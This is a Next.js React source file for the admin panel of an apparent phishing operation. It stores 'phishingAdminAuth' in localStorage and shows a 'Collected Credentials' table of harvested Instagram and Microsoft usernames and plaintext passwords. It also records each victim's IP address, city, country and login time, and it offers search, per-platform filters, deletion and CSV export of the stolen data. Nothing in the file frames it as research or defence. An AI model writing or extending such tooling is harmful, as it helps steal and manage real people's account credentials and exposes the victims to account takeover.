import { useState, useEffect } from 'react';
import { createClient } from '@supabase/supabase-js';
import { useRouter } from 'next/router';
import Head from 'next/head';

// Initialize Supabase client
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
const supabase = createClient(supabaseUrl, supabaseAnonKey);

export default function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [credentials, setCredentials] = useState([]);
  const [stats, setStats] = useState({
    totalEntries: 0,
    instagramEntries: 0,
    microsoftEntries: 0,
    countries: {},
    continents: {}
  });
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState('all');
  const [darkMode, setDarkMode] = useState(false);
  const [deleteLoading, setDeleteLoading] = useState(false);
  const [deleteError, setDeleteError] = useState('');
  
  const router = useRouter();
  
  // Handle login
  const handleLogin = (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    // Simple hardcoded password for testing
    const correctPassword = "YourSecurePassword123"; 
    
    if (password === correctPassword) {
      setIsAuthenticated(true);
      localStorage.setItem('phishingAdminAuth', 'true');
      fetchCredentials();
    } else {
      setError('Invalid password');
    }
    setLoading(false);
  };
  
  // Check if already authenticated
  useEffect(() => {
    const auth = localStorage.getItem('phishingAdminAuth');
    if (auth === 'true') {
      setIsAuthenticated(true);
      fetchCredentials();
    }
    
    // Check for dark mode preference
    const prefersDark = localStorage.getItem('darkMode') === 'true';
    setDarkMode(prefersDark);
    if (prefersDark) {
      document.body.classList.add('dark-mode');
    }
  }, []);
  
  // Toggle dark mode
  const toggleDarkMode = () => {
    setDarkMode(!darkMode);
    localStorage.setItem('darkMode', !darkMode);
    document.body.classList.toggle('dark-mode');
  };
  
  // Fetch credentials from database
  const fetchCredentials = async () => {
    setLoading(true);
    
    try {
      console.log('Fetching credentials from Supabase...');
      
      // First try the direct API to bypass any client-side issues
      try {
        const response = await fetch('/api/direct-query');
        const result = await response.json();
        
        if (result.success && result.data) {
          console.log('Successfully fetched data via API:', result.count + ' records');
          setCredentials(result.data || []);
          calculateStats(result.data || []);
          setLoading(false);
          return;
        } else {
          console.warn('API call succeeded but no data returned:', result);
        }
      } catch (apiError) {
        console.error('Error fetching via API, falling back to direct connection:', apiError);
      }
      
      // Fall back to direct Supabase connection
      const { data, error } = await supabase
        .from('users')
        .select('*')
        .order('login_time', { ascending: false });
        
      if (error) {
        console.error('Supabase error:', error);
        throw error;
      }
      
      console.log('Credentials received directly:', data ? data.length : 0);
      setCredentials(data || []);
      calculateStats(data || []);
    } catch (error) {
      console.error('Error fetching credentials:', error);
      setError('Failed to load data: ' + error.message);
    } finally {
      setLoading(false);
    }
  };
  
  // Calculate statistics from credential data
  const calculateStats = (data) => {
    const stats = {
      totalEntries: data.length,
      instagramEntries: data.filter(item => item.username.includes('(IG)')).length,
      microsoftEntries: data.filter(item => item.username.includes('(hotmail)') || item.username.includes('(MS)')).length,
      countries: {},
      continents: {}
    };
    
    // Count by country and continent
    data.forEach(item => {
      // Count countries
      if (item.country) {
        stats.countries[item.country] = (stats.countries[item.country] || 0) + 1;
      }
      
      // Count continents
      if (item.continent) {
        stats.continents[item.continent] = (stats.continents[item.continent] || 0) + 1;
      }
    });
    
    setStats(stats);
  };
  
  // Handle logout
  const handleLogout = () => {
    localStorage.removeItem('phishingAdminAuth');
    setIsAuthenticated(false);
  };
  
  // Filter credentials
  const filterCredentials = () => {
    if (!credentials) return [];
    
    let filtered = [...credentials];
    
    // Filter by platform
    if (filter === 'instagram') {
      filtered = filtered.filter(cred => 
        cred.username && cred.username.includes('(IG)')
      );
    } else if (filter === 'microsoft') {
      filtered = filtered.filter(cred => 
        cred.username && (cred.username.includes('(MS)') || 
        cred.username.includes('(hotmail)') || 
        cred.username.includes('@hotmail') || 
        cred.username.includes('@outlook') || 
        cred.username.includes('@live'))
      );
    }
    
    // Filter by search term
    if (searchTerm) {
      filtered = filtered.filter(cred =>
        (cred.username && cred.username.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.password && cred.password.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.city && cred.city.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.country && cred.country.toLowerCase().includes(searchTerm.toLowerCase())) ||
        (cred.ip_address && cred.ip_address.toLowerCase().includes(searchTerm.toLowerCase()))
      );
    }
    
    return filtered;
  };
  
  // Export credentials as CSV
  const exportCSV = () => {
    let csvContent = "data:text/csv;charset=utf-8,";
    csvContent += "Username,Password,Country,City,Continent,IP,Date\n";
    
    credentials.forEach(cred => {
      const row = [
        `"${cred.username}"`,
        `"${cred.password}"`,
        `"${cred.country || ''}"`,
        `"${cred.city || ''}"`,
        `"${cred.continent || ''}"`,
        `"${cred.ip_address || ''}"`,
        `"${new Date(cred.login_time).toLocaleString()}"`
      ].join(',');
      csvContent += row + "\n";
    });
    
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "credentials.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };
  
  // Handle record deletion
  const handleDeleteRecord = async (id) => {
    if (!window.confirm('Are you sure you want to delete this record? This action cannot be undone.')) {
      return;
    }
    
    setDeleteLoading(true);
    setDeleteError('');
    
    try {
      const { error } = await supabase
        .from('users')
        .delete()
        .eq('id', id);
      
      if (error) throw new Error(error.message);
      
      // Update the UI by removing the deleted record
      setCredentials(credentials.filter(cred => cred.id !== id));
      
      // Update stats
      fetchCredentials();
      
      // Show success message
      alert('Record deleted successfully');
    } catch (err) {
      console.error('Error deleting record:', err);
      setDeleteError('Failed to delete record: ' + err.message);
    } finally {
      setDeleteLoading(false);
    }
  };
  
  // Modify your renderDataTable function to include delete button
  const renderDataTable = () => {
    const filteredData = credentials.filter(cred => {
      // Your existing filter logic
      let matchesFilter = true;
      if (filter === 'instagram') matchesFilter = cred.platform === 'instagram';
      if (filter === 'microsoft') matchesFilter = cred.platform === 'microsoft';
      
      // Your existing search logic
      const searchFields = [cred.username, cred.password, cred.country, cred.city].join(' ').toLowerCase();
      return matchesFilter && (searchTerm === '' || searchFields.includes(searchTerm.toLowerCase()));
    });
    
    return (
      <div className="table-responsive">
        <table className="credential-table">
          <thead>
            <tr>
              <th>Username</th>
              <th>Password</th>
              <th>Platform</th>
              <th>Country</th>
              <th>IP</th>
              <th>Time</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {filteredData.map(cred => (
              <tr key={cred.id}>
                <td>{cred.username}</td>
                <td>{cred.password}</td>
                <td>{cred.platform}</td>
                <td>{cred.country}</td>
                <td>{cred.ip_address}</td>
                <td>{new Date(cred.login_time).toLocaleString()}</td>
                <td>
                  <button 
                    onClick={() => handleDeleteRecord(cred.id)}
                    disabled={deleteLoading}
                    className="delete-btn"
                    title="Delete record"
                  >
                    {deleteLoading ? 'Deleting...' : '🗑️ Delete'}
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
        
        {deleteError && (
          <div className="error-message" style={{ marginTop: '1rem', color: 'red' }}>
            {deleteError}
          </div>
        )}
        
        {filteredData.length === 0 && (
          <p className="no-results">No records found matching your criteria.</p>
        )}
      </div>
    );
  };
  
  return (
    <>
      <Head>
        <title>Admin Dashboard</title>
        <meta name="robots" content="noindex, nofollow" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
        <style>{`
          /* Add this CSS for delete button */
          .delete-btn {
            background-color: #ff4d4f;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 5px 10px;
            cursor: pointer;
            transition: background-color 0.3s;
          }
          
          .delete-btn:hover {
            background-color: #ff7875;
          }
          
          .delete-btn:disabled {
            background-color: #d9d9d9;
            cursor: not-allowed;
          }
          
          /* Rest of your existing styles */
        `}</style>
      </Head>
      
      <div className={`admin-container ${darkMode ? 'dark-mode' : ''}`}>
        {!isAuthenticated ? (
          <div className="login-container">
            <div className="login-box">
              <h1><i className="fas fa-lock"></i> Admin Login</h1>
              <form onSubmit={handleLogin}>
                <div className="input-group">
                  <label htmlFor="password">Password</label>
                  <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                </div>
                {error && <div className="error-message">{error}</div>}
                <button type="submit" disabled={loading}>
                  {loading ? 'Loading...' : 'Login'}
                </button>
              </form>
              {!isAuthenticated && (
                <button 
                  type="button" 
                  onClick={() => {
                    localStorage.removeItem('phishingAdminAuth');
                    window.location.reload();
                  }} 
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#999',
                    textDecoration: 'underline',
                    cursor: 'pointer',
                    fontSize: '12px',
                    marginTop: '10px'
                  }}
                >
                  Reset Login State
                </button>
              )}
            </div>
          </div>
        ) : (
          <div className="dashboard">
            <header className="dashboard-header">
              <h1><i className="fas fa-chart-line"></i> Admin Dashboard</h1>
              <div className="header-actions">
                <button onClick={toggleDarkMode} className="icon-button">
                  <i className={`fas fa-${darkMode ? 'sun' : 'moon'}`}></i>
                </button>
                <button onClick={handleLogout} className="logout-button">
                  <i className="fas fa-sign-out-alt"></i> Logout
                </button>
              </div>
            </header>
            
            {loading ? (
              <div className="loading">
                <i className="fas fa-spinner fa-spin"></i> Loading data...
              </div>
            ) : (
              <>
                <div className="stats-overview">
                  <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-users"></i></div>
                    <div className="stat-content">
                      <h3>Total Entries</h3>
                      <p className="stat-number">{stats.totalEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon instagram"><i className="fab fa-instagram"></i></div>
                    <div className="stat-content">
                      <h3>Instagram</h3>
                      <p className="stat-number">{stats.instagramEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon microsoft"><i className="fab fa-microsoft"></i></div>
                    <div className="stat-content">
                      <h3>Microsoft</h3>
                      <p className="stat-number">{stats.microsoftEntries}</p>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon"><i className="fas fa-globe"></i></div>
                    <div className="stat-content">
                      <h3>Countries</h3>
                      <p className="stat-number">{Object.keys(stats.countries).length}</p>
                    </div>
                  </div>
                </div>
                
                <div className="data-container">
                  <div className="data-header">
                    <h2><i className="fas fa-table"></i> Collected Credentials</h2>
                    
                    <div className="tabs">
                      <button 
                        className={filter === 'all' ? 'tab-active' : ''}
                        onClick={() => setFilter('all')}
                      >
                        All Records
                      </button>
                      <button 
                        className={filter === 'instagram' ? 'tab-active' : ''}
                        onClick={() => setFilter('instagram')}
                      >
                        Instagram <span className="badge">{stats.instagramEntries}</span>
                      </button>
                      <button 
                        className={filter === 'microsoft' ? 'tab-active' : ''}
                        onClick={() => setFilter('microsoft')}
                      >
                        Microsoft <span className="badge">{stats.microsoftEntries}</span>
                      </button>
                    </div>
                    
                    <div className="data-actions">
                      <div className="search">
                        <i className="fas fa-search"></i>
                        <input 
                          type="text" 
                          placeholder="Search..." 
                          value={searchTerm}
                          onChange={(e) => setSearchTerm(e.target.value)}
                        />
                      </div>
                      
                      <button className="export-button" onClick={exportCSV}>
                        <i className="fas fa-download"></i> Export CSV
                      </button>
                    </div>
                  </div>
                  
                  <div className="data-table-container">
                    {renderDataTable()}
                  </div>
                </div>
              </>
            )}
          </div>
        )}
      </div>
    </>
  );
} 